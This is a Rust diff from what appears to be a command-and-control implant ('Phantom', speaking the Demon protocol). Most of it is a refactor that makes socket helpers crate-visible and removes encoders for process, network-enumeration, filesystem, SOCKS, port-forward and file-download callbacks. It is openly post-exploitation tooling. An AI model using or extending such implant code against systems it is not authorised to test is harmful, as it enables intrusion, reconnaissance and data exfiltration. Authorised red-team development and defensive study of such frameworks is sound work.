     Some(Ok((header_len + 2, SocksConnectRequest { atyp, address, port })))
 }
 
-fn send_socks_reply(
+pub(crate) fn send_socks_reply(
     stream: &mut TcpStream,
     reply: u8,
     atyp: u8,
@@ -4159,7 +3363,10 @@ fn send_socks_reply(
         .map_err(|error| PhantomError::Socket(error.to_string()))
 }
 
-fn write_all_nonblocking(stream: &mut TcpStream, mut data: &[u8]) -> std::io::Result<()> {
+pub(crate) fn write_all_nonblocking(
+    stream: &mut TcpStream,
+    mut data: &[u8],
+) -> std::io::Result<()> {
     while !data.is_empty() {
         match stream.write(data) {
             Ok(0) => return Err(std::io::Error::new(ErrorKind::WriteZero, "socket closed")),
@@ -4172,7 +3379,7 @@ fn write_all_nonblocking(stream: &mut TcpStream, mut data: &[u8]) -> std::io::Re
     Ok(())
 }
 
-fn raw_socket_error(error: &std::io::Error) -> u32 {
+pub(crate) fn raw_socket_error(error: &std::io::Error) -> u32 {
     error.raw_os_error().and_then(|code| u32::try_from(code).ok()).unwrap_or(1)
 }
 
@@ -4510,630 +3717,12 @@ fn normalize_path(value: &str) -> PathBuf {
     }
 }
 
-fn io_error(path: impl AsRef<Path>, error: std::io::Error) -> PhantomError {
+pub(crate) fn io_error(path: impl AsRef<Path>, error: std::io::Error) -> PhantomError {
     PhantomError::Io { path: path.as_ref().to_path_buf(), message: error.to_string() }
 }
 
 fn split_args(arguments: &str) -> Vec<OsString> {
     arguments.split_whitespace().filter(|value| !value.is_empty()).map(OsString::from).collect()
-}
-
-fn encode_process_list(
-    process_ui: u32,
-    processes: &[ProcessEntry],
-) -> Result<Vec<u8>, PhantomError> {
-    let mut payload = encode_u32(process_ui);
-    for process in processes {
-        payload.extend_from_slice(&encode_utf16(&process.name)?);
-        payload.extend_from_slice(&encode_u32(process.pid));
-        payload.extend_from_slice(&encode_bool(process.is_wow64));
-        payload.extend_from_slice(&encode_u32(process.parent_pid));
-        payload.extend_from_slice(&encode_u32(process.session));
-        payload.extend_from_slice(&encode_u32(process.threads));
-        payload.extend_from_slice(&encode_utf16(&process.user)?);
-    }
-    Ok(payload)
-}
-
-fn encode_proc_create(
-    path: &str,
-    pid: u32,
-    success: bool,
-    piped: bool,
-    verbose: bool,
-) -> Result<Vec<u8>, PhantomError> {
-    let mut payload = encode_u32(u32::from(DemonProcessCommand::Create));
-    payload.extend_from_slice(&encode_utf16(path)?);
-    payload.extend_from_slice(&encode_u32(pid));
-    payload.extend_from_slice(&encode_bool(success));
-    payload.extend_from_slice(&encode_bool(piped));
-    payload.extend_from_slice(&encode_bool(verbose));
-    Ok(payload)
-}
-
-fn encode_proc_kill(success: bool, pid: u32) -> Vec<u8> {
-    let mut payload = encode_u32(u32::from(DemonProcessCommand::Kill));
-    payload.extend_from_slice(&encode_bool(success));
-    payload.extend_from_slice(&encode_u32(pid));
-    payload
-}
-
-fn encode_proc_grep(processes: &[ProcessEntry]) -> Result<Vec<u8>, PhantomError> {
-    let mut payload = encode_u32(u32::from(DemonProcessCommand::Grep));
-    for process in processes {
-        payload.extend_from_slice(&encode_utf16(&process.name)?);
-        payload.extend_from_slice(&encode_u32(process.pid));
-        payload.extend_from_slice(&encode_u32(process.parent_pid));
-        payload.extend_from_slice(&encode_utf16(&process.user)?);
-        payload.extend_from_slice(&encode_u32(if process.is_wow64 { 86 } else { 64 }));
-    }
-    Ok(payload)
-}
-
-fn encode_proc_modules(pid: u32, modules: &[(String, u64)]) -> Result<Vec<u8>, PhantomError> {
-    let mut payload = encode_u32(u32::from(DemonProcessCommand::Modules));
-    payload.extend_from_slice(&encode_u32(pid));
-    for (name, base) in modules {
-        payload.extend_from_slice(&encode_bytes(name.as_bytes())?);
-        payload.extend_from_slice(&encode_u64(*base));
-    }
-    Ok(payload)
-}
-
-fn encode_proc_memory(pid: u32, query_protection: u32, regions: &[MemoryRegion]) -> Vec<u8> {
-    let mut payload = encode_u32(u32::from(DemonProcessCommand::Memory));
-    payload.extend_from_slice(&encode_u32(pid));
-    payload.extend_from_slice(&encode_u32(query_protection));
-    for region in regions {
-        payload.extend_from_slice(&encode_u64(region.base));
-        payload.extend_from_slice(&encode_u32(region.size));
-        payload.extend_from_slice(&encode_u32(region.protect));
-        payload.extend_from_slice(&encode_u32(region.state));
-        payload.extend_from_slice(&encode_u32(region.mem_type));
-    }
-    payload
-}
-
-fn encode_net_domain(domain: &str) -> Result<Vec<u8>, PhantomError> {
-    let mut payload = encode_u32(u32::from(DemonNetCommand::Domain));
-    payload.extend_from_slice(&encode_bytes(domain.as_bytes())?);
-    Ok(payload)
-}
-
-fn encode_net_name_list(
-    subcommand: DemonNetCommand,
-    target: &str,
-    names: &[String],
-) -> Result<Vec<u8>, PhantomError> {
-    let mut payload = encode_u32(u32::from(subcommand));
-    payload.extend_from_slice(&encode_utf16(target)?);
-    for name in names {
-        payload.extend_from_slice(&encode_utf16(name)?);
-    }
-    Ok(payload)
-}
-
-fn encode_net_logons(target: &str, users: &[String]) -> Result<Vec<u8>, PhantomError> {
-    encode_net_name_list(DemonNetCommand::Logons, target, users)
-}
-
-fn encode_net_sessions(target: &str, sessions: &[SessionEntry]) -> Result<Vec<u8>, PhantomError> {
-    let mut payload = encode_u32(u32::from(DemonNetCommand::Sessions));
-    payload.extend_from_slice(&encode_utf16(target)?);
-    for session in sessions {
-        payload.extend_from_slice(&encode_utf16(&session.client)?);
-        payload.extend_from_slice(&encode_utf16(&session.user)?);
-        payload.extend_from_slice(&encode_u32(session.active));
-        payload.extend_from_slice(&encode_u32(session.idle));
-    }
-    Ok(payload)
-}
-
-fn encode_net_shares(target: &str, shares: &[ShareEntry]) -> Result<Vec<u8>, PhantomError> {
-    let mut payload = encode_u32(u32::from(DemonNetCommand::Share));
-    payload.extend_from_slice(&encode_utf16(target)?);
-    for share in shares {
-        payload.extend_from_slice(&encode_utf16(&share.name)?);
-        payload.extend_from_slice(&encode_utf16(&share.path)?);
-        payload.extend_from_slice(&encode_utf16(&share.remark)?);
-        payload.extend_from_slice(&encode_u32(share.access));
-    }
-    Ok(payload)
-}
-
-fn encode_net_groups(
-    subcommand: DemonNetCommand,
-    target: &str,
-    groups: &[GroupEntry],
-) -> Result<Vec<u8>, PhantomError> {
-    let mut payload = encode_u32(u32::from(subcommand));
-    payload.extend_from_slice(&encode_utf16(target)?);
-    for group in groups {
-        payload.extend_from_slice(&encode_utf16(&group.name)?);
-        payload.extend_from_slice(&encode_utf16(&group.description)?);
-    }
-    Ok(payload)
-}
-
-fn encode_net_users(target: &str, users: &[UserEntry]) -> Result<Vec<u8>, PhantomError> {
-    let mut payload = encode_u32(u32::from(DemonNetCommand::Users));
-    payload.extend_from_slice(&encode_utf16(target)?);
-    for user in users {
-        payload.extend_from_slice(&encode_utf16(&user.name)?);
-        payload.extend_from_slice(&encode_bool(user.is_admin));
-    }
-    Ok(payload)
-}
-
-fn encode_fs_dir_listing(
-    target: &Path,
-    subdirs: bool,
-    files_only: bool,
-    dirs_only: bool,
-    list_only: bool,
-) -> Result<Vec<u8>, PhantomError> {
-    let start_path = directory_root_path(target);
-    let mut payload = encode_u32(u32::from(DemonFilesystemCommand::Dir));
-    payload.extend_from_slice(&encode_bool(false));
-    payload.extend_from_slice(&encode_bool(list_only));
-    payload.extend_from_slice(&encode_utf16(&start_path)?);
-
-    let listings = collect_directory_listings(target, subdirs, files_only, dirs_only)?;
-    payload.extend_from_slice(&encode_bool(true));
-    for listing in listings {
-        let files = listing.entries.iter().filter(|entry| !entry.is_dir).count() as u32;
-        let dirs = listing.entries.iter().filter(|entry| entry.is_dir).count() as u32;
-        let total_size = listing
-            .entries
-            .iter()
-            .filter(|entry| !entry.is_dir)
-            .map(|entry| entry.size)
-            .sum::<u64>();
-
-        payload.extend_from_slice(&encode_utf16(&listing.root_path)?);
-        payload.extend_from_slice(&encode_u32(files));
-        payload.extend_from_slice(&encode_u32(dirs));
-        if !list_only {
-            payload.extend_from_slice(&encode_u64(total_size));
-        }
-
-        for entry in listing.entries {
-            payload.extend_from_slice(&encode_utf16(&entry.name)?);
-            if !list_only {
-                payload.extend_from_slice(&encode_bool(entry.is_dir));
-                payload.extend_from_slice(&encode_u64(entry.size));
-                payload.extend_from_slice(&encode_u32(entry.modified.day));
-                payload.extend_from_slice(&encode_u32(entry.modified.month));
-                payload.extend_from_slice(&encode_u32(entry.modified.year));
-                payload.extend_from_slice(&encode_u32(entry.modified.minute));
-                payload.extend_from_slice(&encode_u32(entry.modified.hour));
-            }
-        }
-    }
-
-    Ok(payload)
-}
-
-fn collect_directory_listings(
-    target: &Path,
-    subdirs: bool,
-    files_only: bool,
-    dirs_only: bool,
-) -> Result<Vec<FilesystemListing>, PhantomError> {
-    let mut listings = Vec::new();
-    let mut pending = vec![target.to_path_buf()];
-    while let Some(root) = pending.pop() {
-        let mut entries = Vec::new();
-        let read_dir = match fs::read_dir(&root) {
-            Ok(read_dir) => read_dir,
-            // Directory vanished between being queued and being read (TOCTOU).
-            Err(error) if error.kind() == std::io::ErrorKind::NotFound => continue,
-            Err(error) => return Err(io_error(&root, error)),
-        };
-        for entry in read_dir {
-            let entry = match entry {
-                Ok(entry) => entry,
-                Err(error) if error.kind() == std::io::ErrorKind::NotFound => continue,
-                Err(error) => return Err(io_error(&root, error)),
-            };
-            let path = entry.path();
-            let metadata = match entry.metadata() {
-                Ok(metadata) => metadata,
-                Err(error) if error.kind() == std::io::ErrorKind::NotFound => continue,
-                Err(error) => return Err(io_error(&path, error)),
-            };
-            if metadata.is_dir() && subdirs {
-                pending.push(path.clone());
-            }
-            if files_only && metadata.is_dir() {
-                continue;
-            }
-            if dirs_only && metadata.is_file() {
-                continue;
-            }
-            entries.push(FilesystemEntry {
-                name: entry.file_name().to_string_lossy().into_owned(),
-                is_dir: metadata.is_dir(),
-                size: metadata.len(),
-                modified: modified_time(metadata.modified().ok()),
-            });
-        }
-        entries.sort_by(|left, right| left.name.cmp(&right.name));
-        listings.push(FilesystemListing { root_path: directory_root_path(&root), entries });
-    }
-    listings.sort_by(|left, right| left.root_path.cmp(&right.root_path));
-    Ok(listings)
-}
-
-fn modified_time(timestamp: Option<SystemTime>) -> ModifiedTime {
-    let unix_timestamp = timestamp
-        .and_then(|time| time.duration_since(UNIX_EPOCH).ok())
-        .map(|duration| duration.as_secs() as i64)
-        .unwrap_or_default();
-    let datetime =
-        OffsetDateTime::from_unix_timestamp(unix_timestamp).unwrap_or(OffsetDateTime::UNIX_EPOCH);
-    ModifiedTime {
-        day: datetime.day().into(),
-        month: u8::from(datetime.month()).into(),
-        year: u32::try_from(datetime.year()).unwrap_or_default(),
-        minute: datetime.minute().into(),
-        hour: datetime.hour().into(),
-    }
-}
-
-fn directory_root_path(path: &Path) -> String {
-    let display = path.display().to_string();
-    if display.ends_with('/') { display } else { format!("{display}/") }
-}
-
-fn encode_fs_cat(path: &Path, contents: &[u8]) -> Result<Vec<u8>, PhantomError> {
-    let mut payload = encode_u32(u32::from(DemonFilesystemCommand::Cat));
-    payload.extend_from_slice(&encode_utf16(&path.display().to_string())?);
-    payload.extend_from_slice(&encode_bool(true));
-    payload.extend_from_slice(&encode_bytes(contents)?);
-    Ok(payload)
-}
-
-fn encode_fs_path_only(
-    subcommand: DemonFilesystemCommand,
-    path: &Path,
-) -> Result<Vec<u8>, PhantomError> {
-    let mut payload = encode_u32(u32::from(subcommand));
-    payload.extend_from_slice(&encode_utf16(&path.display().to_string())?);
-    Ok(payload)
-}
-
-fn encode_fs_remove(path: &Path, is_dir: bool) -> Result<Vec<u8>, PhantomError> {
-    let mut payload = encode_u32(u32::from(DemonFilesystemCommand::Remove));
-    payload.extend_from_slice(&encode_bool(is_dir));
-    payload.extend_from_slice(&encode_utf16(&path.display().to_string())?);
-    Ok(payload)
-}
-
-fn encode_fs_copy_move(
-    subcommand: DemonFilesystemCommand,
-    success: bool,
-    from: &Path,
-    to: &Path,
-) -> Result<Vec<u8>, PhantomError> {
-    let mut payload = encode_u32(u32::from(subcommand));
-    payload.extend_from_slice(&encode_bool(success));
-    payload.extend_from_slice(&encode_utf16(&from.display().to_string())?);
-    payload.extend_from_slice(&encode_utf16(&to.display().to_string())?);
-    Ok(payload)
-}
-
-fn encode_u32(value: u32) -> Vec<u8> {
-    value.to_le_bytes().to_vec()
-}
-
-fn encode_u64(value: u64) -> Vec<u8> {
-    value.to_le_bytes().to_vec()
-}
-
-fn encode_bool(value: bool) -> Vec<u8> {
-    encode_u32(u32::from(value))
-}
-
-fn encode_bytes(value: &[u8]) -> Result<Vec<u8>, PhantomError> {
-    let len = u32::try_from(value.len())
-        .map_err(|_| PhantomError::InvalidResponse("socket payload too large"))?;
-    let mut out = Vec::with_capacity(4 + value.len());
-    out.extend_from_slice(&len.to_le_bytes());
-    out.extend_from_slice(value);
-    Ok(out)
-}
-
-fn encode_utf16(value: &str) -> Result<Vec<u8>, PhantomError> {
-    let encoded = value.encode_utf16().flat_map(u16::to_le_bytes).collect::<Vec<_>>();
-    encode_bytes(&encoded)
-}
-
-fn encode_port_forward_add(
-    command: DemonSocketCommand,
-    success: bool,
-    socket_id: u32,
-    bind_addr: u32,
-    bind_port: u32,
-    forward_addr: u32,
-    forward_port: u32,
-) -> Vec<u8> {
-    let mut payload = encode_u32(u32::from(command));
-    payload.extend_from_slice(&encode_bool(success));
-    payload.extend_from_slice(&encode_u32(socket_id));
-    payload.extend_from_slice(&encode_u32(bind_addr));
-    payload.extend_from_slice(&encode_u32(bind_port));
-    payload.extend_from_slice(&encode_u32(forward_addr));
-    payload.extend_from_slice(&encode_u32(forward_port));
-    payload
-}
-
-fn encode_socket_open(
-    socket_id: u32,
-    bind_addr: u32,
-    bind_port: u32,
-    forward_addr: u32,
-    forward_port: u32,
-) -> Vec<u8> {
-    let mut payload = encode_u32(u32::from(DemonSocketCommand::Open));
-    payload.extend_from_slice(&encode_u32(socket_id));
-    payload.extend_from_slice(&encode_u32(bind_addr));
-    payload.extend_from_slice(&encode_u32(bind_port));
-    payload.extend_from_slice(&encode_u32(forward_addr));
-    payload.extend_from_slice(&encode_u32(forward_port));
-    payload
-}
-
-fn encode_socket_read_success(
-    socket_id: u32,
-    socket_type: DemonSocketType,
-    data: &[u8],
-) -> Result<Vec<u8>, PhantomError> {
-    let mut payload = encode_u32(u32::from(DemonSocketCommand::Read));
-    payload.extend_from_slice(&encode_u32(socket_id));
-    payload.extend_from_slice(&encode_u32(u32::from(socket_type)));
-    payload.extend_from_slice(&encode_bool(true));
-    payload.extend_from_slice(&encode_bytes(data)?);
-    Ok(payload)
-}
-
-fn encode_socket_read_failure(
-    socket_id: u32,
-    socket_type: DemonSocketType,
-    error_code: u32,
-) -> Vec<u8> {
-    let mut payload = encode_u32(u32::from(DemonSocketCommand::Read));
-    payload.extend_from_slice(&encode_u32(socket_id));
-    payload.extend_from_slice(&encode_u32(u32::from(socket_type)));
-    payload.extend_from_slice(&encode_bool(false));
-    payload.extend_from_slice(&encode_u32(error_code));
-    payload
-}
-
-fn encode_socket_write_failure(
-    socket_id: u32,
-    socket_type: DemonSocketType,
-    error_code: u32,
-) -> Vec<u8> {
-    let mut payload = encode_u32(u32::from(DemonSocketCommand::Write));
-    payload.extend_from_slice(&encode_u32(socket_id));
-    payload.extend_from_slice(&encode_u32(u32::from(socket_type)));
-    payload.extend_from_slice(&encode_bool(false));
-    payload.extend_from_slice(&encode_u32(error_code));
-    payload
-}
-
-fn encode_socket_close(socket_id: u32, socket_type: DemonSocketType) -> Vec<u8> {
-    let mut payload = encode_u32(u32::from(DemonSocketCommand::Close));
-    payload.extend_from_slice(&encode_u32(socket_id));
-    payload.extend_from_slice(&encode_u32(u32::from(socket_type)));
-    payload
-}
-
-fn encode_socket_connect(success: bool, socket_id: u32, error_code: u32) -> Vec<u8> {
-    let mut payload = encode_u32(u32::from(DemonSocketCommand::Connect));
-    payload.extend_from_slice(&encode_bool(success));
-    payload.extend_from_slice(&encode_u32(socket_id));
-    payload.extend_from_slice(&encode_u32(error_code));
-    payload
-}
-
-fn encode_socks_proxy_add(
-    success: bool,
-    socket_id: u32,
-    bind_addr: u32,
-    bind_port: u32,
-) -> Vec<u8> {
-    let mut payload = encode_u32(u32::from(DemonSocketCommand::SocksProxyAdd));
-    payload.extend_from_slice(&encode_bool(success));
-    payload.extend_from_slice(&encode_u32(socket_id));
-    payload.extend_from_slice(&encode_u32(bind_addr));
-    payload.extend_from_slice(&encode_u32(bind_port));
-    payload
-}
-
-fn encode_socks_proxy_remove(socket_id: u32) -> Vec<u8> {
-    let mut payload = encode_u32(u32::from(DemonSocketCommand::SocksProxyRemove));
-    payload.extend_from_slice(&encode_u32(socket_id));
-    payload
-}
-
-fn encode_rportfwd_remove(
-    socket_id: u32,
-    socket_type: DemonSocketType,
-    bind_addr: u32,
-    bind_port: u32,
-    forward_addr: u32,
-    forward_port: u32,
-) -> Vec<u8> {
-    let mut payload = encode_u32(u32::from(DemonSocketCommand::ReversePortForwardRemove));
-    payload.extend_from_slice(&encode_u32(socket_id));
-    payload.extend_from_slice(&encode_u32(u32::from(socket_type)));
-    payload.extend_from_slice(&encode_u32(bind_addr));
-    payload.extend_from_slice(&encode_u32(bind_port));
-    payload.extend_from_slice(&encode_u32(forward_addr));
-    payload.extend_from_slice(&encode_u32(forward_port));
-    payload
-}
-
-fn encode_socket_clear(success: bool) -> Vec<u8> {
-    let mut payload = encode_u32(u32::from(DemonSocketCommand::ReversePortForwardClear));
-    payload.extend_from_slice(&encode_bool(success));
-    payload
-}
-
-fn encode_socks_proxy_clear(success: bool) -> Vec<u8> {
-    let mut payload = encode_u32(u32::from(DemonSocketCommand::SocksProxyClear));
-    payload.extend_from_slice(&encode_bool(success));
-    payload
-}
-
-/// Encode a `DemonCallback::File` (file-open) payload for `BeaconOutput`.
-///
-/// Wire format: `[callback_type:u32][len:u32][file_id:u32][file_size:u32][path:UTF-8]`
-fn encode_file_open(
-    file_id: u32,
-    file_size: u64,
-    file_path: &str,
-) -> Result<Vec<u8>, PhantomError> {
-    let truncated_size = u32::try_from(file_size.min(u64::from(u32::MAX)))
-        .map_err(|_| PhantomError::InvalidResponse("file size overflow"))?;
-    let inner_len = 4 + 4 + file_path.len();
-    let mut payload = Vec::with_capacity(4 + 4 + inner_len);
-    payload.extend_from_slice(&encode_u32(u32::from(DemonCallback::File)));
-    payload.extend_from_slice(&encode_u32(
-        u32::try_from(inner_len)
-            .map_err(|_| PhantomError::InvalidResponse("file open inner too large"))?,
-    ));
-    payload.extend_from_slice(&encode_u32(file_id));
-    payload.extend_from_slice(&encode_u32(truncated_size));
-    payload.extend_from_slice(file_path.as_bytes());
-    Ok(payload)
-}
-
-/// Encode a `DemonCallback::FileWrite` (chunk) payload for `BeaconOutput`.
-///
-/// Wire format: `[callback_type:u32][len:u32][file_id:u32][chunk_data]`
-fn encode_file_chunk(file_id: u32, data: &[u8]) -> Result<Vec<u8>, PhantomError> {
-    let inner_len = 4 + data.len();
-    let mut payload = Vec::with_capacity(4 + 4 + inner_len);
-    payload.extend_from_slice(&encode_u32(u32::from(DemonCallback::FileWrite)));
-    payload.extend_from_slice(&encode_u32(
-        u32::try_from(inner_len)
-            .map_err(|_| PhantomError::InvalidResponse("file chunk inner too large"))?,
-    ));
-    payload.extend_from_slice(&encode_u32(file_id));
-    payload.extend_from_slice(data);
-    Ok(payload)
-}
-
-/// Encode a `DemonCallback::FileClose` payload for `BeaconOutput`.
-///
-/// Wire format: `[callback_type:u32][len:u32][file_id:u32]`
-fn encode_file_close(file_id: u32) -> Result<Vec<u8>, PhantomError> {
-    let mut payload = Vec::with_capacity(12);
-    payload.extend_from_slice(&encode_u32(u32::from(DemonCallback::FileClose)));
-    payload.extend_from_slice(&encode_u32(4));
-    payload.extend_from_slice(&encode_u32(file_id));
-    Ok(payload)
-}
-
-/// Encode a `CommandTransfer` response payload.
-fn encode_transfer_list(downloads: &[ActiveDownload]) -> Vec<u8> {
-    let mut payload = encode_u32(u32::from(DemonTransferCommand::List));
-    for download in downloads {
-        payload.extend_from_slice(&encode_u32(download.file_id));
-        let read_size = u32::try_from(download.read_size).unwrap_or(u32::MAX);
-        payload.extend_from_slice(&encode_u32(read_size));
-        payload.extend_from_slice(&encode_u32(download.state as u32));
-    }
-    payload
-}
-
-/// Encode a transfer stop/resume/remove response payload.
-fn encode_transfer_action(subcommand: DemonTransferCommand, found: bool, file_id: u32) -> Vec<u8> {
-    let mut payload = encode_u32(u32::from(subcommand));
-    payload.extend_from_slice(&encode_bool(found));
-    payload.extend_from_slice(&encode_u32(file_id));
-    payload
-}
-
-/// Encode the secondary close callback sent after a transfer remove, matching Demon behaviour.
-///
-/// Wire format: `[subcommand:u32][file_id:u32][reason:u32]`
-/// Reason 1 = `DOWNLOAD_REASON_REMOVED`.
-fn encode_transfer_remove_close(file_id: u32) -> Vec<u8> {
-    let mut payload = encode_u32(u32::from(DemonTransferCommand::Remove));
-    payload.extend_from_slice(&encode_u32(file_id));
-    payload.extend_from_slice(&encode_u32(1)); // DOWNLOAD_REASON_REMOVED
-    payload
-}
-
-impl PendingCallback {
-    pub(crate) fn command_id(&self) -> u32 {
-        match self {
-            Self::Output { .. } => u32::from(DemonCommand::CommandOutput),
-            Self::Error { .. } => u32::from(DemonCommand::CommandError),
-            Self::Exit { .. } => u32::from(DemonCommand::CommandExit),
-            Self::KillDate { .. } => u32::from(DemonCommand::CommandKillDate),
-            Self::Structured { command_id, .. } => *command_id,
-            Self::MemFileAck { .. } => u32::from(DemonCommand::CommandMemFile),
-            Self::FsUpload { .. } => u32::from(DemonCommand::CommandFs),
-            Self::Socket { .. } => u32::from(DemonCommand::CommandSocket),
-            Self::FileOpen { .. } | Self::FileChunk { .. } | Self::FileClose { .. } => {
-                u32::from(DemonCommand::BeaconOutput)
-            }
-        }
-    }
-
-    pub(crate) fn request_id(&self) -> u32 {
-        match self {
-            Self::Output { request_id, .. }
-            | Self::Error { request_id, .. }
-            | Self::Exit { request_id, .. }
-            | Self::KillDate { request_id, .. }
-            | Self::Structured { request_id, .. }
-            | Self::MemFileAck { request_id, .. }
-            | Self::FsUpload { request_id, .. }
-            | Self::Socket { request_id, .. }
-            | Self::FileOpen { request_id, .. }
-            | Self::FileChunk { request_id, .. }
-            | Self::FileClose { request_id, .. } => *request_id,
-        }
-    }
-
-    pub(crate) fn payload(&self) -> Result<Vec<u8>, PhantomError> {
-        match self {
-            Self::Output { text, .. } => encode_bytes(text.as_bytes()),
-            Self::Error { text, .. } => {
-                let mut payload = Vec::new();
-                payload.extend_from_slice(&encode_u32(0x0d));
-                payload.extend_from_slice(&encode_bytes(text.as_bytes())?);
-                Ok(payload)
-            }
-            Self::Exit { exit_method, .. } => Ok(encode_u32(*exit_method)),
-            Self::KillDate { .. } => Ok(Vec::new()),
-            Self::Structured { payload, .. } => Ok(payload.clone()),
-            Self::MemFileAck { mem_file_id, success, .. } => {
-                let mut payload = Vec::new();
-                payload.extend_from_slice(&encode_u32(*mem_file_id));
-                payload.extend_from_slice(&encode_bool(*success));
-                Ok(payload)
-            }
-            Self::FsUpload { file_size, path, .. } => {
-                let mut payload = encode_u32(u32::from(DemonFilesystemCommand::Upload));
-                payload.extend_from_slice(&encode_u32(*file_size));
-                payload.extend_from_slice(&encode_utf16(path)?);
-                Ok(payload)
-            }
-            Self::Socket { payload, .. } => Ok(payload.clone()),
-            Self::FileOpen { file_id, file_size, file_path, .. } => {
-                encode_file_open(*file_id, *file_size, file_path)
-            }
-            Self::FileChunk { file_id, data, .. } => encode_file_chunk(*file_id, data),
-            Self::FileClose { file_id, .. } => encode_file_close(*file_id),
-        }
-    }
 }
 
 #[cfg(test)]
@@ -5158,6 +3747,8 @@ mod tests {
     use tokio::io::{AsyncReadExt, AsyncWriteExt};
 
     use std::path::Path;
+
+    use super::types::SocksClientState;
 
     use super::{
         DownloadTransferState, GroupEntry, HarvestEntry, MEM_COMMIT, MEM_IMAGE, MEM_MAPPED,
@@ -5773,7 +4364,7 @@ mod tests {
             state
                 .socks_clients
                 .values()
-                .any(|client| matches!(client.state, super::SocksClientState::Relay { .. }))
+                .any(|client| matches!(client.state, SocksClientState::Relay { .. }))
         })
         .await;
 
